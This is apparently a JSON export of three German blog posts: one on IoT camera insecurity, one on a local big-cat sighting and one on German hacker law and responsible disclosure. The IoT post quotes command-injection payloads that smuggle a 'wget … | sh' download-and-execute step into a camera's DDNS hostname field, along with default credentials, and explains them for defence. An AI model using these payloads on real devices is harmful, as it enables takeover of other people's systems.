[
  {
    "itemId": "https://www.kernel-error.de/?p=3461",
    "raw": "\n<p class=\"has-small-font-size\">Vielleicht erinnert ihr euch an meine Aussage, <a href=\"https://www.kernel-error.de/2025/10/30/ip-kameras-risiken-portfreigaben-rtsp-http-checks/\" data-type=\"post\" data-id=\"3422\">dass man jedem Gerät, das man mit dem Internet verbindet, mindestens so viel Vertrauen entgegenbringen sollte wie seiner Haustür</a>. In den letzten Wochen durfte ich das wieder mehrfach sehr anschaulich erklären – direkt anhand realer Beispiele in der IT von Unternehmen oder im privaten Umfeld.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-large is-resized\"><img fetchpriority=\"high\" decoding=\"async\" width=\"1024\" height=\"683\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-1024x683.png\" alt=\"Image of IoT Camera and IT Security\" class=\"wp-image-3467\" style=\"width:233px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/IoT.png 1536w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /></figure></div>\n\n\n<p class=\"has-small-font-size\">Versteht mich nicht falsch: Es geht mir nicht darum, mich über irgendwen lustig zu machen oder zu behaupten, dass nur Fachleute irgendetwas einrichten dürfen. Wenn jemand ein IoT-Gerät kauft – eine Überwachungskamera, ein Thermometer, eine smarte Steckdose – dann geht diese Person zurecht davon aus, dass es „funktioniert“. Und für viele bedeutet „funktionieren“ automatisch auch: Es ist grundsätzlich sicher.<br>Leider ist genau das oft nicht der Fall.</p>\n\n\n\n<h2 class=\"wp-block-heading has-small-font-size\">IoT in der Praxis: Schnell, günstig – und sicherheitsblind</h2>\n\n\n\n<p class=\"has-small-font-size\">Viele dieser kleinen Netzwerkgeräte basieren auf irgendeiner Form von Linux. Das ist günstig, flexibel, gut anpassbar – perfekt für Hersteller, die aus Standardmodulen schnell ein neues „Produkt“ zusammensetzen wollen. Die Funktion steht im Vordergrund, denn die sieht der Kunde sofort. Sicherheitsrelevante Details dagegen sieht niemand und sie verzögern die Entwicklung. Also bekommen sie häufig weniger Aufmerksamkeit.</p>\n\n\n\n<p class=\"has-small-font-size\">Selbst wenn ein Hersteller alles richtig bedenkt, kann später eine neue Angriffstechnik entstehen, gegen die das Gerät keine Abwehr hat. Dann braucht es ein Firmware-Update. Das kostet Geld, Zeit – und es hilft nur, wenn man es auch einspielt.</p>\n\n\n\n<h2 class=\"wp-block-heading has-small-font-size\">„Was soll schon passieren? Es ist doch nur eine Kamera am Mülltonnenplatz …“</h2>\n\n\n\n<p class=\"has-small-font-size\">Viele denken:<br>Was soll&#8217;s? Wenn jemand sehen kann, wie warm es im Keller ist oder welcher Waschbär die Tonnen plündert – na und?</p>\n\n\n\n<p class=\"has-small-font-size\">Das Problem ist nicht der Inhalt der Kamera. Das Problem ist das <em>Gerät selbst</em>.</p>\n\n\n\n<p class=\"has-small-font-size\">IoT-Geräte werden extrem häufig missbraucht – und zwar nicht, um euch auszuspionieren, sondern um sie für fremde Zwecke einzuspannen:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">als Teil eines Botnetzes</li>\n\n\n\n<li class=\"has-small-font-size\">zum Verteilen von Malware</li>\n\n\n\n<li class=\"has-small-font-size\">für DDoS-Angriffe</li>\n\n\n\n<li class=\"has-small-font-size\">zum Minen von Kryptowährungen</li>\n\n\n\n<li class=\"has-small-font-size\">oder als Einstiegspunkt ins dahinterliegende Netzwerk</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\">Im besten Fall merkt man davon nichts – außer vielleicht einem unerklärlich langsamen Internet.<br>Im schlechtesten Fall steht plötzlich die Polizei vor der Tür, weil über die eigene IP-Adresse strafbare Downloads verteilt wurden.</p>\n\n\n\n<p class=\"has-small-font-size\">Und bevor jemand denkt „Das ist doch konstruiert“: Nein. Das passiert. Dauerhaft. Ich sehe fast täglich Spuren solcher Übernahmen.</p>\n\n\n\n<h2 class=\"wp-block-heading has-small-font-size\">Warum diese Geräte so leicht kompromittierbar sind</h2>\n\n\n\n<p class=\"has-small-font-size\">Bei manchen Geräten ist ein Login – falls überhaupt vorhanden – kaum mehr als ein wackliges Gartentor im Nirgendwo. Default-Passwörter, Basic-Auth ohne HTTPS, unsichere Dienste, schlechte Update-Strategien.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignleft size-full is-resized\"><a href=\"https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png\" target=\"_blank\" rel=\" noreferrer noopener\"><img decoding=\"async\" width=\"908\" height=\"819\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png\" alt=\"Screenshot of an compromised asus cctv ip camera iot\" class=\"wp-image-3470\" style=\"width:118px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera.png 908w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-300x271.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-768x693.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/compromised-asus-cctv-iot-ip-camera-676x610.png 676w\" sizes=\"(max-width: 908px) 100vw, 908px\" /></a></figure></div>\n\n\n<p class=\"has-small-font-size\">Ein Klassiker: <em>nicht korrekt geprüfte Eingabefelder</em>.<br>Viele Web-Interfaces akzeptieren blind alles, was man eingibt – und führen es sogar direkt als Teil eines Shell-Befehls aus.</p>\n\n\n\n<p class=\"has-small-font-size\">Beispiel aus einer realen IoT-Kamera-Firmware:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">ddns_DyndnsDynamic_hostname='$(wget http://1.2.3.4/x/vivo -O-|sh)'</pre>\n\n\n\n<p class=\"has-small-font-size\">oder</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">$(wget http://1.2.3.4/ipcam.zavio.sh -O- | sh)</pre>\n\n\n\n<p class=\"has-small-font-size\">Die Zugangsdaten, die man in solchen Feldern eintragen „muss“, sind dabei oft schlicht:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">Benutzername: meow\nKennwort: meow</pre>\n\n\n\n<p class=\"has-small-font-size\">Das Entscheidende ist jedoch die Konstruktion $(…).<br>Linux interpretiert das nicht als Text, sondern als auszuführendes Kommando – mit den Rechten, mit denen die DynDNS-Funktion läuft. Und das ist bei vielen Geräten immer noch root.</p>\n\n\n\n<p class=\"has-small-font-size\">Der eigentliche Befehl ist dann:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">wget http://1.2.3.4/vivo -O- | sh</pre>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">wget lädt eine Datei herunter</li>\n\n\n\n<li class=\"has-small-font-size\">-O- sorgt dafür, dass der Inhalt direkt ausgegeben wird</li>\n\n\n\n<li class=\"has-small-font-size\">das Pipe-Symbol | übergibt den Inhalt an die Shell sh</li>\n\n\n\n<li class=\"has-small-font-size\">die Shell führt alles aus, was darin steht</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\">Sprich: Man lädt ein beliebiges Skript aus dem Internet – und führt es sofort mit root-Rechten aus. Ohne Rückfrage. Ohne Sicherheit.</p>\n\n\n\n<p class=\"has-small-font-size\">Und ja: Das existiert genauso in freier Wildbahn.</p>\n\n\n\n<h2 class=\"wp-block-heading has-small-font-size\">Wenn ihr so etwas in eurer Konfiguration findet: Uff.</h2>\n\n\n\n<p class=\"has-small-font-size\">Dann würde ich dem Gerät nicht mal mehr nach einem Reset vertrauen. Denn:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">Wurde vielleicht eine manipulierte Firmware eingespielt?</li>\n\n\n\n<li class=\"has-small-font-size\">Wurde der Bootloader verändert?</li>\n\n\n\n<li class=\"has-small-font-size\">Wird nach jedem Neustart automatisch eine Backdoor geöffnet?</li>\n\n\n\n<li class=\"has-small-font-size\">Gibt es überhaupt offizielle Firmware-Images zum Neu-Flashen?</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\">Oft lautet die bittere Antwort: <strong>Nein</strong>.<br>Und dann bleibt realistisch nur: Gerät entsorgen.</p>\n\n\n\n<p class=\"has-small-font-size\">Noch schlimmer: Der Angreifer hat damit meist vollen Zugriff auf das Netzwerk hinter dem Gerät.<br>Und IoT-Geräte speichern gerne:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">WLAN-Passwörter</li>\n\n\n\n<li class=\"has-small-font-size\">NAS-Zugangsdaten</li>\n\n\n\n<li class=\"has-small-font-size\">SMTP-Accounts</li>\n\n\n\n<li class=\"has-small-font-size\">API-Tokens</li>\n\n\n\n<li class=\"has-small-font-size\">Nutzer- und Admin-Zugänge anderer Systeme</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\">Damit kann ein Angreifer richtig Schaden anrichten.</p>\n\n\n\n<h2 class=\"wp-block-heading has-small-font-size\">Was also tun?</h2>\n\n\n\n<p class=\"has-small-font-size\">IoT ist nicht böse – aber oft schlecht gemacht.<br>Daher ein paar Grundregeln, die wirklich jeder beherzigen sollte:</p>\n\n\n\n<ul class=\"wp-block-list\">\n<li class=\"has-small-font-size\">IoT immer in ein eigenes, getrenntes Netz.</li>\n\n\n\n<li class=\"has-small-font-size\">Kein direkter Zugriff aus dem Internet – nur wenn es wirklich sein muss und dann sauber gesichert.</li>\n\n\n\n<li class=\"has-small-font-size\">Regelmäßig patchen, prüfen, auditieren.</li>\n\n\n\n<li class=\"has-small-font-size\">Standardpasswörter sofort ändern.</li>\n\n\n\n<li class=\"has-small-font-size\">Alle nicht benötigten Dienste deaktivieren.</li>\n</ul>\n\n\n\n<p class=\"has-small-font-size\">Das ist nicht theoretisch, nicht konstruiert – das ist Alltag. Ich sehe es fast täglich.</p>\n",
    "sanitized": "Vielleicht erinnert ihr euch an meine Aussage, dass man jedem Gerät, das man mit dem Internet verbindet, mindestens so viel Vertrauen entgegenbringen sollte wie seiner Haustür. In den letzten Wochen durfte ich das wieder mehrfach sehr anschaulich erklären – direkt anhand realer Beispiele in der IT von Unternehmen oder im privaten Umfeld.\n\n\n\n\n\n\nVersteht mich nicht falsch: Es geht mir nicht darum, mich über irgendwen lustig zu machen oder zu behaupten, dass nur Fachleute irgendetwas einrichten dürfen. Wenn jemand ein IoT-Gerät kauft – eine Überwachungskamera, ein Thermometer, eine smarte Steckdose – dann geht diese Person zurecht davon aus, dass es „funktioniert“. Und für viele bedeutet „funktionieren“ automatisch auch: Es ist grundsätzlich sicher.Leider ist genau das oft nicht der Fall.\n\n\n\nIoT in der Praxis: Schnell, günstig – und sicherheitsblind\n\n\n\nViele dieser kleinen Netzwerkgeräte basieren auf irgendeiner Form von Linux. Das ist günstig, flexibel, gut anpassbar – perfekt für Hersteller, die aus Standardmodulen schnell ein neues „Produkt“ zusammensetzen wollen. Die Funktion steht im Vordergrund, denn die sieht der Kunde sofort. Sicherheitsrelevante Details dagegen sieht niemand und sie verzögern die Entwicklung. Also bekommen sie häufig weniger Aufmerksamkeit.\n\n\n\nSelbst wenn ein Hersteller alles richtig bedenkt, kann später eine neue Angriffstechnik entstehen, gegen die das Gerät keine Abwehr hat. Dann braucht es ein Firmware-Update. Das kostet Geld, Zeit – und es hilft nur, wenn man es auch einspielt.\n\n\n\n„Was soll schon passieren? Es ist doch nur eine Kamera am Mülltonnenplatz …“\n\n\n\nViele denken:Was soll’s? Wenn jemand sehen kann, wie warm es im Keller ist oder welcher Waschbär die Tonnen plündert – na und?\n\n\n\nDas Problem ist nicht der Inhalt der Kamera. Das Problem ist das Gerät selbst.\n\n\n\nIoT-Geräte werden extrem häufig missbraucht – und zwar nicht, um euch auszuspionieren, sondern um sie für fremde Zwecke einzuspannen:\n\n\n\n\nals Teil eines Botnetzes\n\n\n\nzum Verteilen von Malware\n\n\n\nfür DDoS-Angriffe\n\n\n\nzum Minen von Kryptowährungen\n\n\n\noder als Einstiegspunkt ins dahinterliegende Netzwerk\n\n\n\n\nIm besten Fall merkt man davon nichts – außer vielleicht einem unerklärlich langsamen Internet.Im schlechtesten Fall steht plötzlich die Polizei vor der Tür, weil über die eigene IP-Adresse strafbare Downloads verteilt wurden.\n\n\n\nUnd bevor jemand denkt „Das ist doch konstruiert“: Nein. Das passiert. Dauerhaft. Ich sehe fast täglich Spuren solcher Übernahmen.\n\n\n\nWarum diese Geräte so leicht kompromittierbar sind\n\n\n\nBei manchen Geräten ist ein Login – falls überhaupt vorhanden – kaum mehr als ein wackliges Gartentor im Nirgendwo. Default-Passwörter, Basic-Auth ohne HTTPS, unsichere Dienste, schlechte Update-Strategien.\n\n\n\n\n\n\nEin Klassiker: nicht korrekt geprüfte Eingabefelder.Viele Web-Interfaces akzeptieren blind alles, was man eingibt – und führen es sogar direkt als Teil eines Shell-Befehls aus.\n\n\n\nBeispiel aus einer realen IoT-Kamera-Firmware:\n\n\n\nddns_DyndnsDynamic_hostname='$(wget http://1.2.3.4/x/vivo -O-|sh)'\n\n\n\noder\n\n\n\n$(wget http://1.2.3.4/ipcam.zavio.sh -O- | sh)\n\n\n\nDie Zugangsdaten, die man in solchen Feldern eintragen „muss“, sind dabei oft schlicht:\n\n\n\nBenutzername: meow\nKennwort: meow\n\n\n\nDas Entscheidende ist jedoch die Konstruktion $(…).Linux interpretiert das nicht als Text, sondern als auszuführendes Kommando – mit den Rechten, mit denen die DynDNS-Funktion läuft. Und das ist bei vielen Geräten immer noch root.\n\n\n\nDer eigentliche Befehl ist dann:\n\n\n\nwget http://1.2.3.4/vivo -O- | sh\n\n\n\n\nwget lädt eine Datei herunter\n\n\n\n-O- sorgt dafür, dass der Inhalt direkt ausgegeben wird\n\n\n\ndas Pipe-Symbol | übergibt den Inhalt an die Shell sh\n\n\n\ndie Shell führt alles aus, was darin steht\n\n\n\n\nSprich: Man lädt ein beliebiges Skript aus dem Internet – und führt es sofort mit root-Rechten aus. Ohne Rückfrage. Ohne Sicherheit.\n\n\n\nUnd ja: Das existiert genauso in freier Wildbahn.\n\n\n\nWenn ihr so etwas in eurer Konfiguration findet: Uff.\n\n\n\nDann würde ich dem Gerät nicht mal mehr nach einem Reset vertrauen. Denn:\n\n\n\n\nWurde vielleicht eine manipulierte Firmware eingespielt?\n\n\n\nWurde der Bootloader verändert?\n\n\n\nWird nach jedem Neustart automatisch eine Backdoor geöffnet?\n\n\n\nGibt es überhaupt offizielle Firmware-Images zum Neu-Flashen?\n\n\n\n\nOft lautet die bittere Antwort: Nein.Und dann bleibt realistisch nur: Gerät entsorgen.\n\n\n\nNoch schlimmer: Der Angreifer hat damit meist vollen Zugriff auf das Netzwerk hinter dem Gerät.Und IoT-Geräte speichern gerne:\n\n\n\n\nWLAN-Passwörter\n\n\n\nNAS-Zugangsdaten\n\n\n\nSMTP-Accounts\n\n\n\nAPI-Tokens\n\n\n\nNutzer- und Admin-Zugänge anderer Systeme\n\n\n\n\nDamit kann ein Angreifer richtig Schaden anrichten.\n\n\n\nWas also tun?\n\n\n\nIoT ist nicht böse – aber oft schlecht gemacht.Daher ein paar Grundregeln, die wirklich jeder beherzigen sollte:\n\n\n\n\nIoT immer in ein eigenes, getrenntes Netz.\n\n\n\nKein direkter Zugriff aus dem Internet – nur wenn es wirklich sein muss und dann sauber gesichert.\n\n\n\nRegelmäßig patchen, prüfen, auditieren.\n\n\n\nStandardpasswörter sofort ändern.\n\n\n\nAlle nicht benötigten Dienste deaktivieren.\n\n\n\n\nDas ist nicht theoretisch, nicht konstruiert – das ist Alltag. Ich sehe es fast täglich."
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3457",
    "raw": "\n<p class=\"has-small-font-size\">Ich habe grade eine E-Mail von unserem Vorsitzenden des Ortsausschusses Todenfeld &#8211; Rheinbach in meinem Postfach. Er leitet eine Warnung bezüglich einer Sichtung einer Großkatze weiter.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-scaled.jpg\"><img decoding=\"async\" width=\"728\" height=\"1024\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-728x1024.jpg\" alt=\"Stadt Rheinbach informiert über mögliche Sichtung einer Großkatze bei Kalenborn in der Verbandsgemeinde Altenahr – Hinweis an Waldbesucher, vorsichtig zu sein und ungewöhnliche Tierbeobachtungen dem Ordnungsamt zu melden.\" class=\"wp-image-3458\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-728x1024.jpg 728w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-213x300.jpg 213w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-768x1080.jpg 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-1092x1536.jpg 1092w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-1456x2048.jpg 1456w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-676x951.jpg 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/Stadt_Rheinbach_Grosskatze-scaled.jpg 1820w\" sizes=\"(max-width: 728px) 100vw, 728px\" /></a></figure>\n\n\n\n<p class=\"has-small-font-size\">Öhm, also&#8230; Großkatze? Ich bin mal gespannt <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f600.png\" alt=\"😀\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n",
    "sanitized": "Ich habe grade eine E-Mail von unserem Vorsitzenden des Ortsausschusses Todenfeld – Rheinbach in meinem Postfach. Er leitet eine Warnung bezüglich einer Sichtung einer Großkatze weiter.\n\n\n\n\n\n\n\nÖhm, also… Großkatze? Ich bin mal gespannt"
  },
  {
    "itemId": "https://www.kernel-error.de/?p=3451",
    "raw": "<div class=\"wp-block-image\">\n<figure class=\"alignleft size-large is-resized\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"683\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-1024x683.png\" alt=\"free ethical hackers\" class=\"wp-image-3454\" style=\"width:193px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-1024x683.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-300x200.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-768x512.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher-676x451.png 676w, https://www.kernel-error.de/wp-content/uploads/2025/11/hacker-rechtssicher.png 1536w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></figure></div>\n\n\n<p class=\"has-small-font-size\">Wir leben in Deutschland ja ein bisschen im „<em>Anzeige-ist-raus</em>“-Land. Das merken auch Security-Researcher und ethische Hacker. Solange man Eigentümer:innen/Betreiber:innen nur auf frei und offen erreichbare Probleme hinweist, ist die Welt halbwegs in Ordnung. Sobald man aber beginnt, Schutzmechanismen zu überwinden oder Anwendungen zu übervorteilen, wird’s schnell juristisch dünn. Genau deshalb melde ich in der Regel nur komplett offen erreichbare Dinge – außer es gibt eine security.txt mit klarer Policy oder ein offenes Bug-Bounty mit Safe-Harbor.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"alignright size-full is-resized\"><a href=\"https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"1024\" src=\"https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png\" alt=\"Picture of an useless gate.\" class=\"wp-image-3452\" style=\"width:196px;height:auto\" srcset=\"https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate.png 1024w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-300x300.png 300w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-150x150.png 150w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-768x768.png 768w, https://www.kernel-error.de/wp-content/uploads/2025/11/useless-gate-676x676.png 676w\" sizes=\"auto, (max-width: 1024px) 100vw, 1024px\" /></a></figure></div>\n\n\n<p class=\"has-small-font-size\">Ein „Schutzmechanismus“ kann schon eine simple Basic-Auth sein. Kennt ihr dieses Bild vom Gartentor mitten auf dem Weg? Kein Zaun, keine Mauer, nur ein Tor. Auf dem Weg geht’s nicht weiter – aber einen Schritt nach links über die Wiese, und zack, ums Tor herum. Juristisch blöd: Das Umgehen dieses „Törchens“ kann bereits als Überwinden einer Zugangssicherung gewertet werden. Für die Meldenden kann das zum Problem werden, obwohl sie eigentlich helfen wollen.</p>\n\n\n\n<p class=\"has-small-font-size\">Die Konsequenz: Selbst krasse Lücken werden oft gar nicht gemeldet, wenn davor ein Gartentörchen steht. Leute mit schlechten Absichten gehen natürlich einfach drumherum und nutzen die Lücke – anonym und schwer nachverfolgbar. Ergebnis: Probleme bleiben länger offen, statt sie sauber zu fixen.</p>\n\n\n\n<p class=\"has-small-font-size\">Das sieht auch das BSI so und fordert schon länger mehr Rechtssicherheit für Security-Forschung. Aktuell gibt es wieder Bewegung: <a href=\"https://www.heise.de/news/Hackerparagraf-BSI-Chefin-fordert-Sicherheitsforscher-Entkriminalisierung-11044176.html\" data-type=\"link\" data-id=\"https://www.heise.de/news/Hackerparagraf-BSI-Chefin-fordert-Sicherheitsforscher-Entkriminalisierung-11044176.html\" target=\"_blank\" rel=\"noreferrer noopener\">BSI-Präsidentin Claudia Plattner plädiert öffentlich für eine Entkriminalisierung ethischer Hacker</a> – sinngemäß: „<a href=\"https://gruen-digital.de/2025/11/34522/\" data-type=\"link\" data-id=\"https://gruen-digital.de/2025/11/34522/\" target=\"_blank\" rel=\"noreferrer noopener\">Wer uns vor Cyberangriffen schützt, darf dafür nicht bestraft werden.</a>“ Die letzte Bundesregierung hatte sogar schon einen Entwurf zur Anpassung des sogenannten Hackerparagrafen in der Pipeline; die neue Regierung prüft das Thema weiter.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Zur Einordnung, worum es geht:</strong></p>\n\n\n\n<p class=\"has-small-font-size\"><em>Strafgesetzbuch (StGB) – § 202a Ausspähen von Daten<br>(1) Wer unbefugt sich oder einem anderen Zugang zu Daten, die nicht für ihn bestimmt und gegen unberechtigten Zugang besonders gesichert sind, unter Überwindung der Zugangssicherung verschafft, wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.<br>(2) Daten im Sinne des Absatzes 1 sind nur solche, die elektronisch, magnetisch oder sonst nicht unmittelbar wahrnehmbar gespeichert sind oder übermittelt werden.</em></p>\n\n\n\n<p class=\"has-small-font-size\">Das Problem ist weniger § 202a an sich als das fehlende Safe-Harbor für verantwortungsvolles Melden (Coordinated/Responsible Disclosure). Wenn schon Basic-Auth oder ein dünnes „Do-not-enter“-Schild als „Zugangssicherung“ zählt, macht das legitime Forschung riskant – und genau das will das BSI ändern. Schutz für die Guten, klare Grenzen gegen echten Missbrauch.</p>\n\n\n\n<p class=\"has-small-font-size\">Den aktuellen Überblick fasst Golem gut zusammen; lesenswert:<br><a href=\"https://www.golem.de/news/hackerparagraf-bsi-chefin-fordert-straffreiheit-fuer-ethische-hacker-2511-201852.html?utm_source=chatgpt.com\" target=\"_blank\" rel=\"noreferrer noopener\">https://www.golem.de/news/hackerparagraf-bsi-chefin-fordert-straffreiheit-fuer-ethische-hacker-2511-201852.html</a></p>\n\n\n\n<p class=\"has-small-font-size\">Meta: Ja, ich bleibe auch künftig bei meiner Linie: Tests nur im eigenen Lab oder mit expliziter Erlaubnis. Alles andere ist nicht nur unklug, sondern schlicht rechtlich riskant.</p>\n\n\n\n<p class=\"has-small-font-size\">Ich bleibe bei meinem Tipp für euch: Veröffentlicht eine <a href=\"https://de.wikipedia.org/wiki/Security.txt\" data-type=\"link\" data-id=\"https://de.wikipedia.org/wiki/Security.txt\" target=\"_blank\" rel=\"noreferrer noopener\">security.txt</a>. Solltet ihr mal einen Hinweis bekommen, erinnert euch bitte daran, dass die Person gerade den größten Aufwand und das größte Risiko eingeht, um euch auf ein Problem aufmerksam zu machen. Es wäre viel einfacher, die Lücke für sich auszunutzen, zu verkaufen oder sonst wie zu missbrauchen, als den Schritt nach vorne zu gehen und euch fair zu informieren.</p>\n\n\n\n<p class=\"has-small-font-size\">Natürlich meine ich damit nicht die Leute, die erst einmal 5.000 € „Audit-Gebühr“ sehen wollen oder beim ungefragten Pentesting eure komplette IT aus dem Verkehr schießen. Ich meine die Menschen, die euch auf dem REWE-Parkplatz freundlich darauf hinweisen, dass ihr euer Portemonnaie auf dem Autodach liegen gelassen habt.</p>\n\n\n\n<p class=\"has-small-font-size\"><strong>Bedankt euch einfach.</strong> <img src=\"https://s.w.org/images/core/emoji/16.0.1/72x72/1f642.png\" alt=\"🙂\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p>\n\n\n\n<p></p>\n",
    "sanitized": "Wir leben in Deutschland ja ein bisschen im „Anzeige-ist-raus“-Land. Das merken auch Security-Researcher und ethische Hacker. Solange man Eigentümer:innen/Betreiber:innen nur auf frei und offen erreichbare Probleme hinweist, ist die Welt halbwegs in Ordnung. Sobald man aber beginnt, Schutzmechanismen zu überwinden oder Anwendungen zu übervorteilen, wird’s schnell juristisch dünn. Genau deshalb melde ich in der Regel nur komplett offen erreichbare Dinge – außer es gibt eine security.txt mit klarer Policy oder ein offenes Bug-Bounty mit Safe-Harbor.\n\n\n\n\n\n\nEin „Schutzmechanismus“ kann schon eine simple Basic-Auth sein. Kennt ihr dieses Bild vom Gartentor mitten auf dem Weg? Kein Zaun, keine Mauer, nur ein Tor. Auf dem Weg geht’s nicht weiter – aber einen Schritt nach links über die Wiese, und zack, ums Tor herum. Juristisch blöd: Das Umgehen dieses „Törchens“ kann bereits als Überwinden einer Zugangssicherung gewertet werden. Für die Meldenden kann das zum Problem werden, obwohl sie eigentlich helfen wollen.\n\n\n\nDie Konsequenz: Selbst krasse Lücken werden oft gar nicht gemeldet, wenn davor ein Gartentörchen steht. Leute mit schlechten Absichten gehen natürlich einfach drumherum und nutzen die Lücke – anonym und schwer nachverfolgbar. Ergebnis: Probleme bleiben länger offen, statt sie sauber zu fixen.\n\n\n\nDas sieht auch das BSI so und fordert schon länger mehr Rechtssicherheit für Security-Forschung. Aktuell gibt es wieder Bewegung: BSI-Präsidentin Claudia Plattner plädiert öffentlich für eine Entkriminalisierung ethischer Hacker – sinngemäß: „Wer uns vor Cyberangriffen schützt, darf dafür nicht bestraft werden.“ Die letzte Bundesregierung hatte sogar schon einen Entwurf zur Anpassung des sogenannten Hackerparagrafen in der Pipeline; die neue Regierung prüft das Thema weiter.\n\n\n\nZur Einordnung, worum es geht:\n\n\n\nStrafgesetzbuch (StGB) – § 202a Ausspähen von Daten(1) Wer unbefugt sich oder einem anderen Zugang zu Daten, die nicht für ihn bestimmt und gegen unberechtigten Zugang besonders gesichert sind, unter Überwindung der Zugangssicherung verschafft, wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.(2) Daten im Sinne des Absatzes 1 sind nur solche, die elektronisch, magnetisch oder sonst nicht unmittelbar wahrnehmbar gespeichert sind oder übermittelt werden.\n\n\n\nDas Problem ist weniger § 202a an sich als das fehlende Safe-Harbor für verantwortungsvolles Melden (Coordinated/Responsible Disclosure). Wenn schon Basic-Auth oder ein dünnes „Do-not-enter“-Schild als „Zugangssicherung“ zählt, macht das legitime Forschung riskant – und genau das will das BSI ändern. Schutz für die Guten, klare Grenzen gegen echten Missbrauch.\n\n\n\nDen aktuellen Überblick fasst Golem gut zusammen; lesenswert:https://www.golem.de/news/hackerparagraf-bsi-chefin-fordert-straffreiheit-fuer-ethische-hacker-2511-201852.html\n\n\n\nMeta: Ja, ich bleibe auch künftig bei meiner Linie: Tests nur im eigenen Lab oder mit expliziter Erlaubnis. Alles andere ist nicht nur unklug, sondern schlicht rechtlich riskant.\n\n\n\nIch bleibe bei meinem Tipp für euch: Veröffentlicht eine security.txt. Solltet ihr mal einen Hinweis bekommen, erinnert euch bitte daran, dass die Person gerade den größten Aufwand und das größte Risiko eingeht, um euch auf ein Problem aufmerksam zu machen. Es wäre viel einfacher, die Lücke für sich auszunutzen, zu verkaufen oder sonst wie zu missbrauchen, als den Schritt nach vorne zu gehen und euch fair zu informieren.\n\n\n\nNatürlich 